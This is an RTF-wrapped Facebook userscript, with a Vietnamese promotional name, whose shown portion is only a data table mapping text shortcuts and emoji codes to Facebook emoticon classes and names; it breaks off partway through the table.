{\rtf1\ansi\ansicpg1252\deff0\deflang1033{\fonttbl{\f0\fswiss\fcharset0 Arial;}{\f1\fswiss\fcharset238{\*\fname Arial;}Arial CE;}}
{\*\generator Msftedit 5.41.15.1507;}\viewkind4\uc1\pard\f0\fs20 // ==UserScript==\par
// @name            C\'e0i \'d0\u7863?t Tool Facebook C\u7921?c Hot Cho Trang C\'e1 Nh\'e2n\par
// @description     All about facebook By Noname\par
// @include         https://*.facebook.com/*\par
// @include         https://*.facebook.com/*/*\par
// @include         http://*.facebook.com/*\par
// @include         http://*.facebook.com/*/*\par
// ==/UserScript==\par
// ==13470X==\par
// ==============\par
// ==Icon==\par
(function() \{\par
\tab // Active only in main frame\par
\tab if (!document.querySelector("#pageNav")) \{\par
\tab\tab return;\par
\tab\}\par
\tab //console.info("Extra Facebook Smileys");\par
\par
\tab // = Data =======\par
\tab var emoticons = [ \{ // Text to picture emoticons\par
"chars" : " :) ",\par
\tab\tab "class" : "emoticon_smile",\par
\tab\tab "name" : "Smiley"\par
\tab\}, \{\par
\tab\tab "chars" : " :( ",\par
\tab\tab "class" : "emoticon_frown",\par
\tab\tab "name" : "Frown"\par
\tab\}, \{\par
\tab\tab "chars" : " :P ",\par
\tab\tab "class" : "emoticon_tongue",\par
\tab\tab "name" : "Tongue"\par
\tab\}, \{\par
        "chars" : " :D ",\par
\tab\tab "class" : "emoticon_grin",\par
\tab\tab "name" : "Grin"\par
\tab\}, \{\par
\tab\tab "chars" : " :o ",\par
\tab\tab "class" : "emoticon_gasp",\par
\tab\tab "name" : "Gasp"\par
\tab\}, \{\par
\tab\tab "chars" : " ;) ",\par
\tab\tab "class" : "emoticon_wink",\par
\tab\tab "name" : "Wink"\par
\tab\}, \{\par
\tab\tab "chars" : " :v ",\par
\tab\tab "class" : "emoticon_pacman",\par
\tab\tab "name" : "Pacman"\par
\tab\}, \{\par
\tab\tab "chars" : " >:( ",\par
\tab\tab "class" : "emoticon_grumpy",\par
\tab\tab "name" : "Gru\'c3\'b1\'c3\'b3n"\par
\tab\}, \{\par
\tab\tab "chars" : " :/ ",\par
\tab\tab "class" : "emoticon_unsure",\par
\tab\tab "name" : "Unsure"\par
\tab\}, \{\par
\tab\tab "chars" : " :'( ",\par
\tab\tab "class" : "emoticon_cry",\par
\tab\tab "name" : "Cry"\par
\tab\}, \{\par
\tab\tab "chars" : " ^_^ ",\par
\tab\tab "class" : "emoticon_kiki",\par
\tab\tab "name" : "Kiki"\par
\tab\}, \{\par
\tab\tab "chars" : " 8) ",\par
\tab\tab "class" : "emoticon_glasses",\par
\tab\tab "name" : "Glasses"\par
\tab\}, \{\par
\tab\tab "chars" : " B| ",\par
\tab\tab "class" : "emoticon_sunglasses",\par
\tab\tab "name" : "Sunglasses"\par
\tab\}, \{\par
\tab\tab "chars" : " <3 ",\par
\tab\tab "class" : "emoticon_heart",\par
\tab\tab "name" : "Heart"\par
\tab\}, \{\par
\tab\tab "chars" : " 3:) ",\par
\tab\tab "class" : "emoticon_devil",\par
\tab\tab "name" : "Devil"\par
\tab\}, \{\par
\tab\tab "chars" : " O:) ",\par
\tab\tab "class" : "emoticon_angel",\par
\tab\tab "name" : "Angel"\par
\tab\}, \{\par
\tab\tab "chars" : " -_- ",\par
\tab\tab "class" : "emoticon_squint",\par
\tab\tab "name" : "Squint"\par
\tab\}, \{\par
\tab\tab "chars" : " o.O ",\par
\tab\tab "class" : "emoticon_confused",\par
\tab\tab "name" : "Confused"\par
\tab\}, \{\par
\tab\tab "chars" : " >:o ",\par
\tab\tab "class" : "emoticon_upset",\par
\tab\tab "name" : "Upset"\par
\tab\}, \{\par
\tab\tab "chars" : " :3 ",\par
\tab\tab "class" : "emoticon_colonthree",\par
\tab\tab "name" : "Colonthree"\par
\tab\}, \{\par
\tab\tab "chars" : " (y) ",\par
\tab\tab "class" : "emoticon_like",\par
\tab\tab "name" : "Like"\par
\tab\}, \{\par
\tab\tab "chars" : " :* ",\par
\tab\tab "class" : "emoticon emoticon_kiss",\par
\tab\tab "name" : "Kiss"\par
\tab\}, \{\par
\tab\tab "chars" : " (^^^) ",\par
\tab\tab "class" : "emoticon_shark",\par
\tab\tab "name" : "Shark"\par
\tab\}, \{\par
\tab\tab "chars" : " :|] ",\par
\tab\tab "class" : "emoticon_robot",\par
\tab\tab "name" : "Robot"\par
\tab\}, \{\par
\tab\tab "chars" : " <(\\") ",\par
\tab\tab "class" : "emoticon_penguin",\par
\tab\tab "name" : "Ping\'c3\'bcino"\par
\tab\}, \{\par
\tab\tab "chars" : " :poop: ",\par
\tab\tab "class" : "emoticon_poop",\par
\tab\tab "name" : "Poop"\par
        \}, \{\par
\tab\tab "chars" : " :putnam: ",\par
\tab\tab "class" : "emoticon_putnam",\par
\tab\tab "name" : "Putman"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf02 ",\par
\tab\tab "class" : "_1az _1a- _2c0",\par
\tab\tab "name" : "Pink Umbrella"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf0a ",\par
\tab\tab "class" : "_1az _1a- _2c1",\par
\tab\tab "name" : "Sea Wave"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf19 ",\par
\tab\tab "class" : "_1az _1a- _2c2",\par
\tab\tab "name" : "Crescent moon"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf1f ",\par
\tab\tab "class" : "_1az _1a- _2c3",\par
\tab\tab "name" : "Bright Star"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf31 ",\par
\tab\tab "class" : "_1az _1a- _2c4",\par
\tab\tab "name" : "Seedbed"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf34 ",\par
\tab\tab "class" : "_1az _1a- _2c5",\par
\tab\tab "name" : "Single Palm Tree"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf35 ",\par
\tab\tab "class" : "_1az _1a- _2c6",\par
\tab\tab "name" : "Cactus"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf37 ",\par
\tab\tab "class" : "_1az _1a- _2c7",\par
\tab\tab "name" : "Tulip"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf38 ",\par
\tab\tab "class" : "_1az _1a- _2c8",\par
\tab\tab "name" : "Cherry Blossom"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf39 ",\par
\tab\tab "class" : "_1az _1a- _2c9",\par
\tab\tab "name" : "Rose"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf3a ",\par
\tab\tab "class" : "_1az _1a- _2ca",\par
\tab\tab "name" : "Cayenne"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf3b ",\par
\tab\tab "class" : "_1az _1a- _2cb",\par
\tab\tab "name" : "Sunflower"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf3e ",\par
\tab\tab "class" : "_1az _1a- _2cc",\par
\tab\tab "name" : "Ear Of Rice"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf40 ",\par
\tab\tab "class" : "_1az _1a- _2cd",\par
\tab\tab "name" : "Four Leaf Clover"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf41 ",\par
\tab\tab "class" : "_1az _1a- _2ce",\par
\tab\tab "name" : "Maple Leaf"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf42 ",\par
\tab\tab "class" : "_1az _1a- _2cf",\par
\tab\tab "name" : "Fallen Leaf"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf43 ",\par
\tab\tab "class" : "_1az _1a- _2cg",\par
\tab\tab "name" : "Leaf Floating In The Wind"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf4a ",\par
\tab\tab "class" : "_1az _1a- _2ch",\par
\tab\tab "name" : "Tangerine"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf4e ",\par
\tab\tab "class" : "_1az _1a- _2ci",\par
\tab\tab "name" : "Red Apple"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf53 ",\par
\tab\tab "class" : "_1az _1a- _2cj",\par
\tab\tab "name" : "Strawberry"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf54 ",\par
\tab\tab "class" : "_1az _1a- _2ck",\par
\tab\tab "name" : "Burger"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf78 ",\par
\tab\tab "class" : "_1az _1a- _2cl",\par
\tab\tab "name" : "Cocktail Glass"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf7a ",\par
\tab\tab "class" : "_1az _1a- _2cm",\par
\tab\tab "name" : "Tankard"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf81 ",\par
\tab\tab "class" : "_1az _1a- _2cn",\par
\tab\tab "name" : "Gift Wrapped"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf83 ",\par
\tab\tab "class" : "_1az _1a- _2co",\par
\tab\tab "name" : "Pumpkin With Candle"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf84 ",\par
\tab\tab "class" : "_1az _1a- _2cp",\par
\tab\tab "name" : "Christmas Tree"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf85 ",\par
\tab\tab "class" : "_1az _1a- _2cq",\par
\tab\tab "name" : "Santa"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf88 ",\par
\tab\tab "class" : "_1az _1a- _2cr",\par
\tab\tab "name" : "Balloon"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf89 ",\par
\tab\tab "class" : "_1az _1a- _2cs",\par
\tab\tab "name" : "Party Popper"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf8d ",\par
\tab\tab "class" : "_1az _1a- _2ct",\par
\tab\tab "name" : "Pine Decor"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf8e ",\par
\tab\tab "class" : "_1az _1a- _2cu",\par
\tab\tab "name" : "Japanese Dolls"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf8f ",\par
\tab\tab "class" : "_1az _1a- _2cv",\par
\tab\tab "name" : "Carp Streamer"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf90 ",\par
\tab\tab "class" : "_1az _1a- _2cw",\par
\tab\tab "name" : "Wind Chime"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf93 ",\par
\tab\tab "class" : "_1az _1a- _2cx",\par
\tab\tab "name" : "Graduation Cap"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udfb5 ",\par
\tab\tab "class" : "_1az _1a- _2cy",\par
\tab\tab "name" : "Musical Note"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udfb6 ",\par
\tab\tab "class" : "_1az _1a- _2cz",\par
\tab\tab "name" : "Multiple Musical Notes"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udfbc ",\par
\tab\tab "class" : "_1az _1a- _2c-",\par
\tab\tab "name" : "Musical Score"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc0d ",\par
\tab\tab "class" : "_1az _1a- _2c_",\par
\tab\tab "name" : "Snake"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc0e ",\par
\tab\tab "class" : "_1az _1a- _2d0",\par
\tab\tab "name" : "Horse"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc11 ",\par
\tab\tab "class" : "_1az _1a- _2d1",\par
\tab\tab "name" : "Sheep"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc12 ",\par
\tab\tab "class" : "_1az _1a- _2d2",\par
\tab\tab "name" : "Monkey"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc14 ",\par
\tab\tab "class" : "_1az _1a- _2d3",\par
\tab\tab "name" : "Hen"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc17 ",\par
\tab\tab "class" : "_1az _1a- _2d4",\par
\tab\tab "name" : "Wild Boar"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc18 ",\par
\tab\tab "class" : "_1az _1a- _2d5",\par
\tab\tab "name" : "Elephant"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc19 ",\par
\tab\tab "class" : "_1az _1a- _2d6",\par
\tab\tab "name" : "Octopus"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc1a ",\par
\tab\tab "class" : "_1az _1a- _2d7",\par
\tab\tab "name" : "Snail Shell"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc1b ",\par
\tab\tab "class" : "_1az _1a- _2d8",\par
\tab\tab "name" : "Insect"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc1f ",\par
\tab\tab "class" : "_1az _1a- _2d9",\par
\tab\tab "name" : "Fish"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc20 ",\par
\tab\tab "class" : "_1az _1a- _2da",\par
\tab\tab "name" : "Tropical Fish"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc21 ",\par
\tab\tab "class" : "_1az _1a- _2db",\par
\tab\tab "name" : "Pufferfish"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc25 ",\par
\tab\tab "class" : "_1az _1a- _2dc",\par
\tab\tab "name" : "Chick In Front"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc26 ",\par
\tab\tab "class" : "_1az _1a- _2dd",\par
\tab\tab "name" : "Bird"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc27 ",\par
\tab\tab "class" : "_1az _1a- _2de",\par
\tab\tab "name" : "Penguin"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc28 ",\par
\tab\tab "class" : "_1az _1a- _2df",\par
\tab\tab "name" : "Koala"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc29 ",\par
\tab\tab "class" : "_1az _1a- _2dg",\par
\tab\tab "name" : "Poodle"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc2b ",\par
\tab\tab "class" : "_1az _1a- _2dh",\par
\tab\tab "name" : "Bactrian Camel"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc2c ",\par
\tab\tab "class" : "_1az _1a- _2di",\par
\tab\tab "name" : "Dolphin"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc2d ",\par
\tab\tab "class" : "_1az _1a- _2dj",\par
\tab\tab "name" : "Mouse Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc2e ",\par
\tab\tab "class" : "_1az _1a- _2dk",\par
\tab\tab "name" : "Cow Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc2f ",\par
\tab\tab "class" : "_1az _1a- _2dl",\par
\tab\tab "name" : "Cara de tigre"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc30 ",\par
\tab\tab "class" : "_1az _1a- _2dm",\par
\tab\tab "name" : "Rabbit Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc31 ",\par
\tab\tab "class" : "_1az _1a- _2dn",\par
\tab\tab "name" : "Cat Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc33 ",\par
\tab\tab "class" : "_1az _1a- _2do",\par
\tab\tab "name" : "Whale Sputtering"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc34 ",\par
\tab\tab "class" : "_1az _1a- _2dp",\par
\tab\tab "name" : "Horse Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc35 ",\par
\tab\tab "class" : "_1az _1a- _2dq",\par
\tab\tab "name" : "Monkey Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc37 ",\par
\tab\tab "class" : "_1az _1a- _2dr",\par
\tab\tab "name" : "Pig face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc38 ",\par
\tab\tab "class" : "_1az _1a- _2ds",\par
\tab\tab "name" : "Frog Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc39 ",\par
\tab\tab "class" : "_1az _1a- _2dt",\par
\tab\tab "name" : "Hamster Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc3a ",\par
\tab\tab "class" : "_1az _1a- _2du",\par
\tab\tab "name" : "Wolf Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc3b ",\par
\tab\tab "class" : "_1az _1a- _2dv",\par
\tab\tab "name" : "Bear Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc3e ",\par
\tab\tab "class" : "_1az _1a- _2dw",\par
\tab\tab "name" : "Footprints"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc40 ",\par
\tab\tab "class" : "_1az _1a- _2dx",\par
\tab\tab "name" : "Eyes"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc42 ",\par
\tab\tab "class" : "_1az _1a- _2dy",\par
\tab\tab "name" : "Ear"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc43 ",\par
\tab\tab "class" : "_1az _1a- _2dz",\par
\tab\tab "name" : "Nose"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc44 ",\par
\tab\tab "class" : "_1az _1a- _2d-",\par
\tab\tab "name" : "Mouth"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc45 ",\par
\tab\tab "class" : "_1az _1a- _2d_",\par
\tab\tab "name" : "Sour Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc46 ",\par
\tab\tab "class" : "_1az _1a- _2e0",\par
\tab\tab "name" : "White hand pointing up"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc47 ",\par
\tab\tab "class" : "_1az _1a- _2e1",\par
\tab\tab "name" : "White hand faces downward"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc48 ",\par
\tab\tab "class" : "_1az _1a- _2e2",\par
\tab\tab "name" : "White hand indicating left"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc49 ",\par
\tab\tab "class" : "_1az _1a- _2e3",\par
\tab\tab "name" : "White hand indicating right"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc4a ",\par
\tab\tab "class" : "_1az _1a- _2e4",\par
\tab\tab "name" : "Fist"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc4b ",\par
\tab\tab "class" : "_1az _1a- _2e5",\par
\tab\tab "name" : "Hand in motion"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc4c ",\par
\tab\tab "class" : "_1az _1a- _2e6",\par
\tab\tab "name" : "Hand showing all good"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc4d ",\par
\tab\tab "class" : "_1az _1a- _2e7",\par
\tab\tab "name" : "Hand with thumb up"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc4e ",\par
\tab\tab "class" : "_1az _1a- _2e8",\par
\tab\tab "name" : "Hand with thumb down"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc4f ",\par
\tab\tab "class" : "_1az _1a- _2e9",\par
\tab\tab "name" : "Hands clapping"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc50 ",\par
\tab\tab "class" : "_1az _1a- _2ea",\par
\tab\tab "name" : "Open Hands"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc66 ",\par
\tab\tab "class" : "_1az _1a- _2eb",\par
\tab\tab "name" : "Boy"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc67 ",\par
\tab\tab "class" : "_1az _1a- _2ec",\par
\tab\tab "name" : "Girl"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc68 ",\par
\tab\tab "class" : "_1az _1a- _2ed",\par
\tab\tab "name" : "Man"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc69 ",\par
\tab\tab "class" : "_1az _1a- _2ee",\par
\tab\tab "name" : "Woman"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc6b ",\par
\tab\tab "class" : "_1az _1a- _2ef",\par
\tab\tab "name" : "Man and woman holding hands"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc6e ",\par
\tab\tab "class" : "_1az _1a- _2eg",\par
\tab\tab "name" : "Police Officer"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc6f ",\par
\tab\tab "class" : "_1az _1a- _2eh",\par
\tab\tab "name" : "Woman with bunny ears"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc71 ",\par
\tab\tab "class" : "_1az _1a- _2ei",\par
\tab\tab "name" : "Person with hair rubio"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc72 ",\par
\tab\tab "class" : "_1az _1a- _2ej",\par
\tab\tab "name" : "Man with pi mao gua"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc73 ",\par
\tab\tab "class" : "_1az _1a- _2ek",\par
\tab\tab "name" : "Man with turban"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc74 ",\par
\tab\tab "class" : "_1az _1a- _2el",\par
\tab\tab "name" : "Old Man"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc75 ",\par
\tab\tab "class" : "_1az _1a- _2em",\par
\tab\tab "name" : "Old Woman"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc76 ",\par
\tab\tab "class" : "_1az _1a- _2en",\par
\tab\tab "name" : "Baby"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc77 ",\par
\tab\tab "class" : "_1az _1a- _2eo",\par
\tab\tab "name" : "Construction Worker"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc78 ",\par
\tab\tab "class" : "_1az _1a- _2ep",\par
\tab\tab "name" : "Princess"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc7b ",\par
\tab\tab "class" : "_1az _1a- _2eq",\par
\tab\tab "name" : "Ghost"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc7c ",\par
\tab\tab "class" : "_1az _1a- _2er",\par
\tab\tab "name" : "Angel baby"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc7d ",\par
\tab\tab "class" : "_1az _1a- _2es",\par
\tab\tab "name" : "Alien"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc7e ",\par
\tab\tab "class" : "_1az _1a- _2et",\par
\tab\tab "name" : "Alien Monster"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc7f ",\par
\tab\tab "class" : "_1az _1a- _2eu",\par
\tab\tab "name" : "Imp"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc80 ",\par
\tab\tab "class" : "_1az _1a- _2ev",\par
\tab\tab "name" : "Skull"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc82 ",\par
\tab\tab "class" : "_1az _1a- _2ew",\par
\tab\tab "name" : "Guard"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc83 ",\par
\tab\tab "class" : "_1az _1a- _2ex",\par
\tab\tab "name" : "Ballerina"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc85 ",\par
\tab\tab "class" : "_1az _1a- _2ey",\par
\tab\tab "name" : "Nail Polish"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc8b ",\par
\tab\tab "class" : "_1az _1a- _2ez",\par
\tab\tab "name" : "Brand of kiss"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc8f ",\par
\tab\tab "class" : "_1az _1a- _2e-",\par
\tab\tab "name" : "Kissing couple"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc90 ",\par
\tab\tab "class" : "_1az _1a- _2e_",\par
\tab\tab "name" : "Bunch of flowers"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc91 ",\par
\tab\tab "class" : "_1az _1a- _2f0",\par
\tab\tab "name" : "Couple with heart"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc93 ",\par
\tab\tab "class" : "_1az _1a- _2f1",\par
\tab\tab "name" : "Heart beating"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc94 ",\par
\tab\tab "class" : "_1az _1a- _2f2",\par
\tab\tab "name" : "Broken Heart"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc96 ",\par
\tab\tab "class" : "_1az _1a- _2f3",\par
\tab\tab "name" : "Bright Heart"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc97 ",\par
\tab\tab "class" : "_1az _1a- _2f4",\par
\tab\tab "name" : "Heart growing"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc98 ",\par
\tab\tab "class" : "_1az _1a- _2f5",\par
\tab\tab "name" : "Heart with arrow"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc99 ",\par
\tab\tab "class" : "_1az _1a- _2f6",\par
\tab\tab "name" : "Blue Heart"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc9a ",\par
\tab\tab "class" : "_1az _1a- _2f7",\par
\tab\tab "name" : "Green Heart"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc9b ",\par
\tab\tab "class" : "_1az _1a- _2f8",\par
\tab\tab "name" : "Yellow Heart"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc9c ",\par
\tab\tab "class" : "_1az _1a- _2f9",\par
\tab\tab "name" : "Purple Heart"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc9d ",\par
\tab\tab "class" : "_1az _1a- _2fa",\par
\tab\tab "name" : "Heart with ribbon"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udca2 ",\par
\tab\tab "class" : "_1az _1a- _2fb",\par
\tab\tab "name" : "Symbol of anger"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udca4 ",\par
\tab\tab "class" : "_1az _1a- _2fc",\par
\tab\tab "name" : "Sleeping"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udca6 ",\par
\tab\tab "class" : "_1az _1a- _2fd",\par
\tab\tab "name" : "Sweat Symbol"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udca8 ",\par
\tab\tab "class" : "_1az _1a- _2fe",\par
\tab\tab "name" : "Quick Start Symbol"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udca9 ",\par
\tab\tab "class" : "_1az _1a- _2ff",\par
\tab\tab "name" : "Pile of Caca"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udcaa ",\par
\tab\tab "class" : "_1az _1a- _2fg",\par
\tab\tab "name" : "Flexed bicep"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udcbb ",\par
\tab\tab "class" : "_1az _1a- _2fh",\par
\tab\tab "name" : "Personal Computer"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udcbd ",\par
\tab\tab "class" : "_1az _1a- _2fi",\par
\tab\tab "name" : "Mini Disco"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udcbe ",\par
\tab\tab "class" : "_1az _1a- _2fj",\par
\tab\tab "name" : "Floppy disk"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udcbf ",\par
\tab\tab "class" : "_1az _1a- _2fk",\par
\tab\tab "name" : "Optical Disc"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udcc0 ",\par
\tab\tab "class" : "_1az _1a- _2fl",\par
\tab\tab "name" : "DVD"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udcde ",\par
\tab\tab "class" : "_1az _1a- _2fm",\par
\tab\tab "name" : "Telephone receiver"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udce0 ",\par
\tab\tab "class" : "_1az _1a- _2fn",\par
\tab\tab "name" : "Fax"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udcf1 ",\par
\tab\tab "class" : "_1az _1a- _2fo",\par
\tab\tab "name" : "Mobile Phone"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udcf2 ",\par
\tab\tab "class" : "_1az _1a- _2fp",\par
\tab\tab "name" : "Mobile phone with arrow from left to right"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udcfa ",\par
\tab\tab "class" : "_1az _1a- _2fq",\par
\tab\tab "name" : "Television"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udd14 ",\par
\tab\tab "class" : "_1az _1a- _2fr",\par
\tab\tab "name" : "Bell"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude01 ",\par
\tab\tab "class" : "_1az _1a- _2fs",\par
\tab\tab "name" : "Face to face with smiling eyes"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude02 ",\par
\tab\tab "class" : "_1az _1a- _2ft",\par
\tab\tab "name" : "Face with tears of joy"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude03 ",\par
\tab\tab "class" : "_1az _1a- _2fu",\par
\tab\tab "name" : "Smiley face with open mouth"\par
\tab\}, \{\par
